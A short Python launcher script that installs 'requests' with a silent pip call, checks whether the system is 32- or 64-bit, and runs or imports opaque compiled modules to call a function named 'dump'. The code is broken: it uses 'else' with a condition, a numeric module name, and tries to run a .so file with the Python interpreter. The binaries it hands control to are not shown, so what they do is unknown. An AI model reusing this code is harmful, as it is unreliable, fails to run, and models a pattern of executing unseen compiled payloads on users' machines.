import os, platform
try:
    import requests
except:
    os.system('pip install requests')
import requests
bit = platform.architecture()[0]
if bit == '32bit':
   os.system('python 32.cpython-311.so')
else bit == '64bit':
   from 64 import dump
   dump()
